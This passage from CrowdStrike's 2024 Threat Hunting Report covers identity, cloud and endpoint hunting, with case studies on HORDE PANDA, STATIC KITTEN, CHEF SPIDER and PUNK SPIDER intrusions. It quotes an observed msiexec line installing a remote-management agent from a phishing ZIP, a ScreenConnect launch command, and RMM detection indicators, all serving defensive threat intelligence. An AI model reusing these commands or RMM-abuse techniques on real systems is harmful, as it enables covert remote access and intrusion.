GLOBAL
SAUDI ARABIA22
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Identity 
Hunting
Adversaries continue to maximize the use of stolen 
identities and attempt to minimize defenders network 
visibility by living off the land and therefore reducing 
potential indicators or alerts on the endpoint, which the 
adversary knows is heavily scrutinized. This tactic hinders 
threat hunters ability to differentiate adversary activity 
from typical user and system administrator activity. 
Living Off the Land
"Living off the land" refers to a strategy used by attackers to avoid 
detection by using legitimate tools and processes already present 
on a victim's system rather than introducing their own malicious 
software. This tactic leverages built\-in system utilities and trusted 
applications to carry out malicious activities, making it more difficult 
for traditional security measures to identify and block the attack. 
By blending in with normal operations, attackers can maintain a low 
profile and extend their presence within a network without raising 
immediate alarms.23
CROWDSTRIKE 2024 THREAT HUNTING REPORT
To achieve their objectives, adversaries must often use valid accounts and user identities in novel ways. For 
example, an adversary may need to elevate privileges or interact with previously uncontacted hosts, leaving 
behavior patterns that threat hunters can easily detect. 
The Falcon Identity Protection module does not rely on endpoint telemetry and instead collects all communication 
made to enabled DCs, so the CrowdStrike OverWatch team often identifies compromises before the adversary 
pivots internally. For example, when an adversary is detected obtaining a foothold on an unmanaged internet\-facing 
host (such as a network appliance), the early warning gives defenders more time to identify and contain attackers 
before they cause material damage. This reduces overall remediation efforts and prevents wide\-scale compromise 
of the victim environment.
CrowdStrike OverWatch uses additional Falcon Identity Protection telemetry including auditing logs to identify 
the following TTPs after a threat actor authenticates on a victim system:
CrowdStrike OverWatch routinely gathers Falcon Identity Protection data to determine account characteristics and 
whether actions performed on an account are atypical for example, when a non\-privileged account attempts to 
perform privileged actions, as demonstrated in the following HORDE PANDA incident.
Brute\-forcing
Privilege 
escalation
Lateral movement 
from managed or 
unmanaged hosts
Gathering 
additional 
compromised 
credentials
Identifying 
authentication 
into cloud 
applications24
CROWDSTRIKE 2024 THREAT HUNTING REPORT
 CASE STUDY: 
HORDE PANDA Activity
Between late June 2023 and early August 2023, using identity\-based 
indicators, CrowdStrike OverWatch identified suspicious activity at a 
South Asian telecommunications provider. The China\-nexus HORDE 
PANDA adversary leveraged multiple compromised identities to 
attempt to embed themselves further into the network and move 
laterally. The adversary gained initial access via the VPN IP range. 
HORDE PANDA likely assumed that using valid identities from the 
VPN range would obfuscate their activity however, they were 
no match against CrowdStrike OverWatch, Falcon Complete and 
identity\-based detections. 
In early July 2023, CrowdStrike OverWatch investigated identity 
hunting leads for unusual activity targeting a DC. This activity 
originated from unexpected sources, including the VPN IP range and 
a host that was not registered with a Falcon sensor for endpoint. 
Domain replication requests using DCSync had been attempted 
from five user accounts but were unsuccessful, as the requesting 
accounts lacked the permissions for domain replication. 
DCSync Attack
DCSync is a credential dumping technique where an adversary 
abuses DC synchronization to trick a DC into sharing sensitive 
information. The adversary imitates a DC and receives data 
replicated from Active Directory, such as passwords.25
CROWDSTRIKE 2024 THREAT HUNTING REPORT
CrowdStrike OverWatch in collaboration with Falcon Complete and the 
customer used identity hunting leads to determine which host did not have 
endpoint sensor coverage. After installing the sensor, CrowdStrike OverWatch 
identified two HORDE PANDA implants operating on the compromised host.
Falcon Complete swiftly contained the impacted host and reset compromised 
account passwords.
HORDE PANDAs implants leveraged legitimate executables to side\-load malicious 
LuaPlug and KEYPLUG dynamic link libraries (DLLs). LuaPlug established 
persistence as a service, and KEYPLUG established persistence as a scheduled 
task. As mentioned above, both implants were deployed to the system before 
the Falcon sensor was installed, and CrowdStrike therefore cannot determine the 
infection vector. However, implant analysis revealed further indicators that can 
inform future threat hunting. 
In mid\-July 2023, HORDE PANDA attempted to reestablish access to domain 
accounts after reacquiring the updated password for a previously compromised 
account. The adversary began searching for Local Administrator Password 
Solution (LAPS) attributes via Lightweight Directory Access Protocol (LDAP) and 
for objects that allowed unrestricted delegation. CrowdStrike OverWatch had not 
previously observed these types of LDAP queries at this customer, and threat 
hunters were alerted immediately. The adversary continued to attempt to regain 
access to privileged identities, leveraging 11 compromised user accounts but 
CrowdStrike OverWatch detected the adversarys activity using telemetry 
provided by Falcon Identity Protection.
Identity hunting allowed CrowdStrike OverWatch to disrupt HORDE PANDAs 
activity by enabling hunters to increase the customers network visibility, 
uncovering the main host that the adversary used to conduct operations.
By closely monitoring the actions of known compromised accounts via
identity telemetry, CrowdStrike OverWatch was able to identify when other 
anomalous accounts started attempting similar activity, leaving the adversary 
nowhere to hide. 
Reader Note:
Identity data is any information (such as data associated with accounts) 
that uniquely identifies an individual or entity and includes information 
regarding authentication and access controls (such as credentials, 
permissions, security tokens or digital certificates).
CROWDSTRIKE 2024 THREAT HUNTING REPORT26
Cloud 
Hunting
The boundary between the endpoint domain and cloud domain 
is increasingly blurred as adversaries develop their cross\-domain 
prowess. As the number of organizations moving to or hosting data 
on cloud services increases, so does the importance of defending 
cloud environments. CrowdStrike increasingly observes threat actors 
targeting and abusing cloud services to complete malicious objectives. 
As reported in the CrowdStrike 2024 Global Threat Report, cloud 
environment intrusions increased 75%, cloud\-conscious cases increased 
by 110% and cloud\-agnostic cases increased by 60% year\-over\-year 
from 2022 to 2023\. 
Using data from CrowdStrike Falcon Cloud Security, the CrowdStrike 
OverWatch team's cloud\-based threat hunting has expanded visibility 
into the runtime environments of critical cloud infrastructures and cloud 
control planes. Having full insight into telemetry spanning endpoint, 
identity and cloud environments is a force multiplier for threat hunting. 
CrowdStrike OverWatch can identify impacted hosts, identities and 
workloads at the earliest opportunity, whether the threat originates in 
the cloud or the adversary attempts to move into a cloud environment. 
This visibility ensures CrowdStrike customers can respond to
cloud\-conscious adversaries no matter where the attacks occur.

HAVING 
FULL 
INSIGHT 
INTO 
TELEMETRY 
SPANNING 
ENDPOINT, 
IDENTITY 
AND 
CLOUD 
ENVIRONMENTS 
IS 
A 
FORCE 
MULTIPLIER 
FOR 
THREAT 
HUNTING.
Cloud Control Plane
In a cloud platform, the control plane is the component responsible for 
managing and orchestrating the cloud infrastructure, including provisioning, 
configuration and management of resources such as VMs, storage 
and networking. It serves as the administrative interface for users and 
administrators to interact with the cloud services, enabling the creation, 
scaling and deletion of resources. The control plane is crucial because once 
an adversary gains access, they have nearly complete control of the cloud 
infrastructure.
Cloud\-Conscious Adversary
Cloud\-conscious is a term referring to threat actors that are aware of the ability 
to compromise cloud workloads and use this knowledge to abuse features 
unique to the cloud for their own purposes.27
CROWDSTRIKE 2024 THREAT HUNTING REPORT
CrowdStrike OverWatch uses telemetry from managed cloud workloads to 
identify post\-exploitation activity initiated from the cloud control plane. This 
lateral movement technique provides an adversary with multiple avenues to 
execute commands or scripts for gaining initial access, escalating privileges and 
establishing persistence.
Using telemetry from the cloud management plane, CrowdStrike OverWatch hunts 
for suspicious indicators of attack (IOAs), including manipulating account or object 
permissions and behaviors indicating enumeration activity. These IOAs can include 
tampering with security controls such as multifactor authentication (MFA) 
and disabled logging.
CrowdStrike OverWatch is constantly developing cloud\-based threat hunting leads 
that are based on behaviors that adversaries have adopted to compromise cloud 
environments. Identity\-based data also allows threat hunters to better detect 
anomalies by providing additional intrusion insights.CASE 
STUDY: 
Adversaries Pivot Between Cloud 
Control Plane and Hosted VMsTraditional BGH adversaries continue to lead cloud\-conscious activity. 
SCATTERED SPIDER remains the most prominent adversary in cloud\-based 
intrusions, conducting 29% of all associated activity observed in 2023\. 
Though threat actors such as SCATTERED SPIDER and COZY BEAR have 
targeted cloud infrastructure as their primary means of intrusion, other threat 
actors are slowly beginning to target cloud environments. These threat actors 
often begin targeting cloud infrastructure by querying instance metadata 
for access keys and credentials on newly compromised cloud\-hosted VMs. 
Threat actors can then use these credentials to log in to the cloud control 
plane and perform further activity. 
Between July 2023 and June 2024, CrowdStrike OverWatch observed several 
lower\-sophistication techniques targeting cloud environments. Rather than 
collecting cloud credentials as a standard enumeration practice, numerous 
cloud\-conscious adversaries are pivoting between the cloud control plane and 
cloud\-hosted VMs using the command line tools that interface with the cloud 
control plane and VM management agents. 
When pivoting from a cloud\-hosted VM to the cloud control plane, threat actors 
have often already compromised the instance and used existing tooling located on 
the VM to enumerate data stored in the cloud control plane. 
When pivoting from the cloud control plane to a cloud\-hosted VM, threat actors 
likely compromise a cloud identity and access management (IAM) user to execute 
commands on VMs from the cloud console for further exploitation.28
CROWDSTRIKE 2024 THREAT HUNTING REPORTCASE 
STUDY: 
Threat Actor Enumerates 
Cloud Account Information 
from Compromised VMs
The following case highlights the threat actors area of expertise host\-based 
exploitation but demonstrates a shift toward leveraging the target organizations 
cloud services for further actions on objectives.
In this case, a threat actor accessed a cloud\-hosted VM from a malicious implant 
predating the Falcon sensor and used a pre\-installed command line tool to 
enumerate information from the cloud control plane. The command line tool allows 
users to update and query information from their cloud account using a specified 
set of commands. The threat actor spawned a PowerShell (PS) process using 
the preexisting implant and used the process to interact with the command line 
tool, which was already installed on the VM. The tool likely contained cached 
credentials, granting it access to the cloud control plane for enumeration. The 
threat actor used this tool to obtain additional information about other VMs and 
users within the cloud account. In addition to performing a few successful cloud 
enumeration commands, the actor used the tool to perform multiple commands 
that contained incorrect syntax and failed.
These low\-sophistication commands as well as several mistakes in usage 
demonstrate the threat actors relative lack of knowledge about the command line 
tool and the cloud service structure. In addition to attempting cloud enumeration, 
the threat actor also enumerated local user and host information and attempted to 
remove forensic artifacts from the host. 
This case study highlights that threat actors typically conduct activity from familiar 
locations on the host but attempt to pivot to the cloud control plane to obtain more 
information. CrowdStrike OverWatch quickly identified this activity and notified the 
target organization.29
CROWDSTRIKE 2024 THREAT HUNTING REPORT
As adversaries continue to shift their operations to the cloud moving laterally to and from the cloud and the 
endpoint security teams may struggle to detect such activity. 
Russia state\-nexus adversary; 
often targets Azure services for 
data theft
Financially motivated actor; 
successfully abuses all major 
cloud service providers
Added user accounts to an administrative 
group, reset account passwords and then 
accessed the admin group
Leveraged a federated identity provider (IdP) to 
establish persistence with a federated domain in 
Entra ID, initially relying on AADInternals Azure 
AD backdoor; later added a federated IdP to a 
victims Okta tenant
Accessed credentials stored in cloud\-hosted 
secrets manager and HashiCorp Vault, 
then located a DC inside a victims Azure 
tenant, copied the disks and created a new 
adversary\-controlled VM where the adversary 
mounted the DC disk copies; from those disks, 
the adversary dumped the Active Directory 
database NTDS.dit
Used access to a victims M365 environment to 
search SharePoint Online for VPN setup instructions; 
logged on to the VPN and moved laterally to 
on\-premises servers; used cloud\-hosted VMs 
to move laterally from the cloud control plane 
to computer instances
Leveraged the open\-source S3 Browser to 
exfiltrate data to an external adversary\-controlled 
cloud storage repository
Created a third\-party Entra ID application with 
delegated Microsoft Graph permissions to read 
emails
Primarily used Tor nodes and residential proxy 
services to access the target organizations 
Azure and Microsoft 365 (M365\) portals
Used multiple methods including 
adding mailbox permissions, modifying 
folder permissions and using the 
ApplicationImpersonation role to 
access user mailboxes for data exfiltration
Figure 8\. Observed cloud\-conscious tactics, techniques and procedures (TTPs)
COZY 
BEAR
SCATTERED
SPIDER
Queried instance metadata for cloud 
access keys and credentials
Unattributed actors of varying motivations; conduct simple cloud 
enumeration alongside more successful traditional exploitation tactics
CLOUD 
LEARNERS
Used a pre\-installed command line tool with cached 
credentials to perform basic cloud control plane enumeration
CROWDSTRIKE 2024 THREAT HUNTING REPORT30
To mitigate intrusion techniques similar to those demonstrated in these 
cloud\-conscious incidents, CrowdStrike recommends the following measures:
Gain a comprehensive understanding of any cloud platform running on a network
Standardize and validate cloud resource configurations before deployment, 
and regularly monitor for deviations from approved standards
Apply the same security policies to cloud workload servers as any other server, 
and deny outbound connections initiated from any server that does not link to 
allowlisted endpoints
Monitor cloud assets and vulnerability implementations, and mitigate risks in a 
timely manner
Apply the principle of least privilege to cloud infrastructure; evaluate credentials, 
configurations and precedence to ensure users have the least\-privileged access 
necessary to function
Remove cached credentials from VMs31
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Endpoint Hunting
CrowdStrike OverWatchs threat hunters have constantly honed and refined their tooling and threat hunting 
methodologies to adapt to the constantly evolving threat landscape. Though novel TTPs for endpoint exploitation 
are always emerging, adversaries still frequently rely on previous reliable techniques, including leveraging 
legitimate RMM tools for illicit activity. To evidence this trend, over the past 12 months, CrowdStrike OverWatch 
observed a significant 70% year\-over\-year increase in incidents leveraging RMM tools. 
Key Facts and Figures:
Adversary use of RMM tools increased 70% year\-over\-year
27% of all interactive intrusions used RMM tools (July 2023\-June 2024\)
ConnectWise ScreenConnect surpassed AnyDesk and became the most observed RMM tool 
Figure 9\. Adversary use of RMM tools, July 2022\-June 2023 vs. July 2023\-June 2024
156%
30%
56%
64%
146%
14%
233%
\-9%
\>500%
50%
CONNECTWISE 
SCREENCONNECT
ANYDESK
TEAMVIEWER
ATERA AGENT
SPLASHTOP
NETSUPPORT 
MANAGER
MESHAGENT
RUSTDESK
QUICK 
ASSIST
FLEETDECK
JULY 2022\-JUNE 2023
JULY 2023\-JUNE 2024
70%
INCREASE
in adversary use 
of RMM tools
27% of all interactive intrusions used RMM tools
ConnectWise ScreenConnect surpassed AnyDesk 
and became the most observed RMM tool32
CROWDSTRIKE 2024 THREAT HUNTING REPORT
In 2022, the self\-hosted remote desktop software application ConnectWise 
ScreenConnect (formerly known as ConnectWise Control) was the second 
most frequently observed RMM tool over the past year, ScreenConnect 
use increased 156%, making it the most observed RMM tool.
Targeted intrusion adversary FAMOUS CHOLLIMA has frequently 
employed AnyDesk in their operations throughout the past year, and this tool 
has also remained highly popular with numerous eCrime adversaries, including 
SCATTERED SPIDER, MANGLED SPIDER, PUNK SPIDER and BITWISE SPIDER. 
Adversaries have increasingly used RMM tools for the following reasons:
RMM tools do not require licenses for non\-commercial applications.
The tools offer stability, professional GUI and robust capabilities.
RMM tools provide detection evasion, particularly in environments where IT 
departments use RMM tools for business purposes.
In most cases, adversaries only deploy RMM tools after achieving initial access. 
These tools allow actors to maintain persistence after successfully compromising 
systems via other methods, including through compromised credentials. 
In some cases, the adversary uses the RMM tool as their initial point of access. 
CHEF SPIDER used this tactic in May 2024, leveraging RMM tools delivered via 
social engineering to gain initial access to a network. 
Figure 10\. CHEF SPIDER uses RMM tool for initial access
CHEF SPIDER develops 
a unique persona to 
lure victims
CHEF SPIDER makes initial contact 
with victim via the Contact Us form 
on victims website
Victim visits weaponized link 
that contacts inauthentic 
meeting domain
ScreenConnect 
downloaded to 
victims host
Victim executes ScreenConnect, 
establishing contact with CHEF 
SPIDER\-controlled infrastructure
Malicious .bat script is 
executed, manipulating power 
settings on victim host
Intrusion plus 6 minutes
Intrusion plus 5 minutes
Intrusion plus 
approximately 20 
seconds
Intrusion minus 
approximately 3 hours
Intrusion minus 
5 days, 20 hours
Intrusion 
minus 6 days
Intrusion
14 weeks prior to 
initial access
Victim believes inquiry is 
legitimate and responds
CHEF SPIDER sends 
a calendar invite for 
a meeting
CHEF SPIDER sends phishing 
email to reschedule meeting; email 
contains a weaponized link33
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Within minutes of the CHEF SPIDER intrusion, CrowdStrike OverWatch threat hunters responded to 
a lead for an Outlook process spawning a web browser that contacted a suspicious domain. It took 
approximately eight minutes for CrowdStrike OverWatch to reconstruct the activity, confirm the activity 
was likely malicious and link the activity to CHEF SPIDER. During this time, hunters gathered initial 
information to assist defenders with their investigation and then sent a notification to Falcon Complete. 
While Falcon Complete began remediation efforts with the customer, CrowdStrike OverWatch continued 
to monitor activity for any attempts by CHEF SPIDER to move laterally or gain a stronger foothold. Minutes 
after the intrusion began, CrowdStrike OverWatch disrupted CHEF SPIDERs intrusion attempt.
 CASE STUDY: 
Hunting the 
STATIC KITTEN Adversary 
Targeted intrusion adversaries, including prolific Iran\-based 
adversary STATIC KITTEN, also continue to rely on RMM tooling 
in their operations. STATIC KITTEN routinely relies on RMM tools 
for persistence within target networks, and during the past year, 
CrowdStrike OverWatch observed the adversary using multiple RMM 
tools, including Atera, Level.io, SimpleHelp, ScreenConnect, Tactical 
RMM and Action1\. 
In March 2024, STATIC KITTEN engaged in phishing activity to deliver 
ScreenConnect and Atera to government, telecom and technology 
entities in the Middle East and South Asia. In June 2024, STATIC 
KITTEN continued using the Atera RMM tool during a spear\-phishing 
campaign against a healthcare entity in the Middle East, marking the 
latest in their series of operations using RMM tools to target Middle 
East\-based entities. 
In June 2024, CrowdStrike OverWatch observed STATIC KITTEN 
employ spear\-phishing emails to target a healthcare organization in 
the Middle East. CrowdStrike OverWatch threat hunters observed the 
adversary download suspicious ZIP files from a cloud storage platform 
on two hosts. Executing the ZIP file resulted in subsequent execution 
of an MSI file. The MSI file was an installer for the Atera Agent remote 
management software. 
CMD : "C:WINDOWSSystem32msiexec.exe" i 
"C:Users\[REDACTED\-USERNAME] 
AppDataLocalTempTemp1\_srca.zipsrca.msi"34
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Following the initial notification, CrowdStrike OverWatch observed 
at least six additional hosts attempting to retrieve the malicious ZIP 
from the same cloud storage location, likely indicating that other users 
received the same targeted phishing emails. These attempts did not 
result in successful download of malicious tooling.
STATIC KITTENs use of legitimate RMM tools delivered via MSI can 
present a challenge for threat hunters and defenders. Executing MSI 
files via msiexec.exe is a standard Windows execution method, 
resulting in a significant amount of data to analyze. Determining which 
processes may be malicious by process name alone can be time\-
consuming. 
Even narrowing a search to include only RMM software installers may 
not yield results, as adversaries such as STATIC KITTEN will often 
rename the installer file. 
To identify RMM tool execution (such as Atera Agent), CrowdStrike 
OverWatch threat hunters search for command lines containing 
integrator login account details in the form of email addresses. 
Additionally, CrowdStrike OverWatch focuses on STATIC KITTENs 
common delivery methods. The adversary regularly downloads tooling 
from cloud service providers; another way to detect STATIC KITTEN 
is by hunting for web browser processes containing single\-argument 
command lines to cloud storage services. Organizations with
embedded threat hunting teams can further narrow their search 
criteria by identifying which RMM and cloud storage services are 
expected in their environment.
STATIC KITTEN routinely changes TTPs and operational cadence 
for each campaign, but CrowdStrike OverWatch threat hunters have 
observed that STATIC KITTEN often recycles techniques albeit with 
variations in each campaign. For example, the adversary may update 
or rewrite their custom tooling, but the execution method may remain 
the same. Alternatively, while STATIC KITTEN may use a new RMM 
tool, they may use the same cloud storage provider to deliver the tool 
to a targeted host. CrowdStrike OverWatch threat hunters collaborate 
closely with the larger CrowdStrike Counter Adversary Operations team 
to track adversaries such as STATIC KITTEN by understanding their 
actions across their entire kill chain.35
CROWDSTRIKE 2024 THREAT HUNTING REPORT
To hunt for and protect against RMM threats, 
CrowdStrike recommends the following measures:
Establish a baseline of approved RMM software and expected RMM users 
in your organization by collaborating with relevant stakeholders such as IT 
services. Thoroughly investigate unexpected RMM tools or users.
Establish a baseline of expected legitimate RMM tool behavior. Profile normal 
directory paths, remote connection domains, remote IP addresses and files written 
by RMM tools. For example, AnyDesk normally writes a file named 
gcapi.dll; files with 
other names may be malicious. Define expected child and grandchild process trees.
Monitor for known RMM tool\-related filenames, file paths or process names. 
Though some adversaries rename RMM tools, less sophisticated adversaries do not.
For example, ScreenConnects network deployer is named 
ScreenConnectClientNetworkDeployer.exe by default. TeamViewers core 
process is named TeamViewer\_Desktop.exe by default, and the main GUI process is 
named TeamViewer.exe. AnyDesk is installed to C:ProgramDataAnyDeskAnyDesk.exe 
by default.
Monitor for or block access to main service provider domains hosting RMM tools 
(e.g download.teamviewer\[.]com).
Monitor for anomalous DNS requests and network connections typical of unexpected RMM tools.
Monitor process trees for anomalous parameters and flags typical of unexpected RMM tools:
ConnectWise ScreenConnect uses numerous launch parameters, including e, 
 y, 
 h, 
 p, 
 s, 
 k, 
 t
and c 
(see Figure 11\).
ConnectWise ScreenConnect can run manual shell commands that manifest as .cmd 
scripts with filenames ending in 
run.cmd 
(e.g "cmd.exe" c "C:WindowsTEMPScreenConnectrun.cmd").
AnyDesk command line installers (EXE and MSI versions) run with the install flag, and 
adversaries typically install AnyDesk with the silent flag.
Search for artifacts (such as logs) that RMM tools write to disk. 
For example, AnyDesk artifacts are written to C:ProgramDataAnyDesk or 
C:Users%Username%AppdataRoamingAnyDesk by default. ConnectWise typically writes files 
to C:Program Files (x86\)ScreenConnect Client (\[uuid]).
"C:Program Files (x86\)ScreenConnect Client 
(\[uuid])ScreenConnect.ClientService.exe" 
"?e\=Access\&y\=Guest\&h\=instance\-\[REDACTED \- Relay 
ID]\-relay.screenconnect.com\&p\=443\&s\=\[truncated]\&k\=\[truncated]\&t\=\&c\=\&c\= 
\&c\=\&c\=\&c\=\&c\=\&c\=\&c\="
Figure 11\. ScreenConnect launch process example36
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Countering 
the Adversary 
Hunting and countering todays adversaries requires speed, accuracy and 
human ingenuity and CrowdStrike delivers all three. As adversaries continue 
to evolve, threat hunters have to apply creative and lateral thinking to ensure 
they maintain the speed and accuracy necessary to outpace the adversary. 
The CrowdStrike 2024 Global Threat Report identified that the average 
breakout time for an eCrime adversary was 62 minutes in 2023\. Breakout time 
refers to the average time it takes an adversary to move laterally within a victim 
network after gaining access. For most organizations, 62 minutes is a very 
narrow window to disrupt the adversary before they embed, which is where 
the support of CrowdStrike OverWatchs cutting\-edge threat hunting bridges 
the gap.
To highlight the importance of speed, accuracy and human ingenuity when 
hunting and countering the adversary at every turn, the following interactive 
intrusion case study examines an attack by one of the most prevalent and 
fast\-moving eCrime adversaries: PUNK SPIDER. 
When accessing victims network environments, PUNK SPIDER typically 
operates quickly to identify and exfiltrate sensitive data and deploy Akira 
ransomware, requiring an urgent response from network defenders. 
In this incident, the Falcon sensor immediately detected the adversary, 
and CrowdStrike OverWatch and Falcon Complete prevented PUNK SPIDER 
from impacting the victim.37
CROWDSTRIKE 2024 THREAT HUNTING REPORT
 CASE STUDY: 
Hunting PUNK SPIDER
PUNK SPIDER has emerged as one of the most prevalent and fastest 
adversaries that CrowdStrike OverWatch has observed over the past year. 
First identified in April 2023, PUNK SPIDER is a BGH adversary that develops 
and maintains the Akira ransomware and the associated Akira dedicated leak 
site (DLS). Similar to many other BGH actors, PUNK SPIDER leverages sensitive 
data exfiltration and encryption to extort ransom payments from victims.
In April 2024, CrowdStrike OverWatch and Falcon Complete identified 
suspected PUNK SPIDER activity at a North American technology company. 
Together and supplemented with information from the victim CrowdStrike 
identified that PUNK SPIDER had accessed the victims network environment 
through an unmanaged3 Palo Alto Networks GlobalProtect VPN appliance 
vulnerable to CVE\-2024\-3400 exploitation. The first evidence of adversary 
activity was when PUNK SPIDER used a service account to log on to another 
network host via Remote Desktop Protocol (RDP), causing the Falcon sensor 
to immediately alert CrowdStrike OverWatch to potential malicious activity. 
PUNK SPIDER then attempted to dump credentials and deploy legitimate 
proxy\-tunneling and remote access tools to establish persistence.
The adversary attempted to elevate their privileges by adding compromised 
and adversary\-created user accounts to local administrator groups and the 
ESX Admins group. PUNK SPIDER commonly uses this technique to gain privileged 
access to ESXi devices, as members of the ESX Admins group automatically have 
administrative access to all ESXi devices in the same Active Directory domain. 
However, the Falcon sensor blocked these privilege escalation attempts. 
In communication with the victim, Falcon Complete began containing 
compromised accounts and devices to prevent PUNK SPIDER from 
adversely affecting the victims operations.
PUNK SPIDER attempted to use the open\-source reconnaissance tool 
SharpShares to enumerate network shares the adversary regularly identifies 
network shares before exfiltrating data and deploying their proprietary Akira 
ransomware. When the Falcon sensor prevented this execution, the adversary 
attempted to use an Antimalware Scan Interface (AMSI) bypass to execute 
Invoke\-ShareFinder.ps1, another network share reconnaissance 
tool and the Falcon sensor also prevented this execution. PUNK SPIDER 
attempted to execute Akira ransomware on compromised devices, and the 
Falcon sensor prevented the Akira ransomware from encrypting any files.
Running out of time, PUNK SPIDER used WinRAR to collect and archive data 
and attempted to use FileZilla to exfiltrate the file archives. When countering 
a known adversary such as PUNK SPIDER, Falcon Complete leverages tactical 
custom IOAs and applies them to the customer environment. This prevented 
PUNK SPIDER from using FileZilla to exfiltrate data. 
3 
An unmanaged device is a device without an installed Falcon sensor.
38
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Throughout the incident, CrowdStrike OverWatch and Falcon Complete identified 
PUNK SPIDER\-associated user accounts and network traffic and ultimately terminated their 
access to the victim, preventing the adversary from exfiltrating data and deploying ransomware. 
Adversaries such as PUNK SPIDER will continue to push the limits of their capabilities to achieve 
their actions on objectives, often returning to the same target and attempting a new approach. 
However, CrowdStrike OverWatch is always one step ahead, constantly improving advanced detections 
and gaining insights into adversary behaviors.
VS.
PUNK SPIDER
INITIAL 
ACCESS
\+ 12\-14
MINUTES
\+ 3
MINUTES
\+ 8
MINUTES
\+ 15
MINUTES
\+ 60
MINUTES
ESCALATION
CONTAINMENT
RECONNAISSANCE
A service account is used to RDP 
into a system
PUNK SPIDER begins their initial post\-access 
actions 12 minutes after leveraging the 
compromised credentials 
PUNK SPIDER begins to conduct basic 
network reconnaissance and downloads 
additional payloads unique across the 
CrowdStrike telemetry
PUNK SPIDER attempts to dump additional 
credentials from the system in an attempt to 
look for additional privileges that could help 
them in their objectives 
PUNK SPIDER begins to introduce custom 
scripts onto the system in an attempt to 
subvert Falcon sensor preventions
The Falcon sensor flags this activity as 
suspicious and alerts Falcon Complete 
and CrowdStrike OverWatch
The Falcon sensor prevents these files 
from running on the system in real time
The reconnaissance conducted by PUNK 
SPIDER triggers CrowdStrike OverWatch 
detections, and the Falcon sensor prevents 
the additional payloads from running 
The attempted credential dumping creates 
additional CrowdStrike OverWatch detections, 
which are being actively monitored
The Falcon sensor flags this activity as 
suspicious and alerts Falcon Complete 
and CrowdStrike OverWatch
CrowdStrike OverWatch has triggered 
customer alerts and provided the details to 
its Falcon Complete counterparts
Falcon Complete contains the hosts while 
it escalates to the customer and further 
investigates
Falcon Complete informs the customer 
about the host containment and provides 
immediate recommendations
Falcon Complete holds an advisory call 
with the customer detailing the disabling of 
compromised accounts as well as custom 
IOCIOA preventions that were put in place
Figure 12\. CrowdStrike counters PUNK SPIDER at a North American technology company39
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Conclusion
This report shares the perspectives and insights that CrowdStrike 
OverWatch threat hunters gain during interactive intrusion attempts on 
a daily basis. As technology evolves and security strategies improve, 
adversaries are becoming stronger, smarter and faster. From cross\-domain 
proficiency to identity\-based attacks and cloud targeting, adversaries 
continuously strive to widen their reach and deepen their impact. 
While adversaries seek weaknesses and search for creative ways to 
avoid detection, the CrowdStrike OverWatch team is similarly sharpening 
its tools and narrowing its focus. When attackers and defenders battle 
over operational sophistication and tradecraft, speed often becomes 
the tiebreaker.
As adversaries gain access to victims more quickly and shift gears 
when necessary to navigate new security challenges, defenders race to 
maintain the advantage. To increase their speed, attackers and defenders 
leverage all available tools, including AI. However, attackers have only 
recently leveraged AI to conduct faster, more sophisticated attacks, 
whereas CrowdStrike has long been using AI to predict adversary 
behavior and significantly improve protection.
Since its 2011 founding, CrowdStrike has been at the forefront of machine 
learning and AI innovation in cybersecurity, and it will continue to pioneer 
in this space. CrowdStrikes AI is trained on trillions of security events and 
augmented with continuous feedback from CrowdStrike OverWatch threat 
hunters and intelligence experts. CrowdStrike regularly uses AI to:
Combat increasingly sophisticated attacks by identifying adversary 
behavior and threat patterns.
Solve hyperscale data challenges by analyzing intelligence and threat 
telemetry with speed and at scale.
Automate repetitive security tasks and unleash machine\-speed 
intelligence to automate detection and response.40
CROWDSTRIKE 2024 THREAT HUNTING REPORT
In 2021, CrowdStrike OverWatch patented a hunting tool 
that detects security violations.4 The tool employs AI to predict 
whether an event is malicious based on the command lines ancestry. 
Using three distinct AI models to identify behaviors associated 
with malware and targeted intrusion activity, the tool supports both 
hunting lead generation and optimization. It classifies hunting leads, 
funneling only relevant data for threat hunters and ensuring that 
hunters can operate at scale quickly to identify an intrusion at its 
earliest stages. 
In todays challenging threat landscape, tooling is imperative and AI 
is just one tool in an arsenal that empowers CrowdStrike OverWatch 
threat hunters. CrowdStrike OverWatch continuously harnesses 
cutting\-edge technologies to enhance defenses and stop adversaries 
in their tracks. 
But tooling alone is not enough to thwart todays sophisticated 
adversaries. While CrowdStrike OverWatch threat hunters work 
relentlessly to detect and disrupt adversaries, CrowdStrike Counter 
Adversary Operations and the extended CrowdStrike team 
provide additional layers of human expertise and a unified security 
approach to stop even the stealthiest of adversaries.
Adversaries aren't stopping, and neither are we. Together, we can 
outsmart and outpace today's most sophisticated threats. We have 
never been more committed to stopping breaches and building a 
more resilient future together.
4 
https:www.crowdstrike.comblogfalcon\-overwatch\-granted\-patents\-for\-two\-innovative\-workflow\-tools 
Learn More41
CROWDSTRIKE 2024 THREAT HUNTING REPORT
About 
CrowdStrike
CrowdStrike (Nasdaq: CRWD), a global cybersecurity leader, has redefined 
modern security with the worlds most advanced cloud\-native platform for 
protecting critical areas of enterprise risk endpoints and cloud workloads, 
identity and data. 
Powered by the CrowdStrike Security Cloud and world\-class AI, the 
CrowdStrike Falcon platform leverages real\-time indicators of attack, threat 
intelligence, evolving adversary tradecraft and enriched telemetry from across 
the enterprise to deliver hyper\-accurate detections, automated protection and 
remediation, elite threat hunting and prioritized observability of vulnerabilities. 
Purpose\-built in the cloud with a single lightweight\-agent architecture, the 
Falcon platform delivers rapid and scalable deployment, superior protection and 
performance, reduced complexity and immediate time\-to\-value.
CrowdStrike: We stop breaches. 
Learn more: www.crowdstrike.com
Follow us: Blog \| X \| LinkedIn \| Facebook \| Instagram
Start a free trial today: www.crowdstrike.comfree\-trial\-guide
 2024 CrowdStrike, Inc. All rights reserved. CrowdStrike, the falcon logo, CrowdStrike Falcon and 
CrowdStrike Threat Graph are marks owned by CrowdStrike, Inc. and registered with the United States 
Patent and Trademark Office, and in other countries. CrowdStrike owns other trademarks and service 
marks, and may use the brands of third parties to identify their products and services.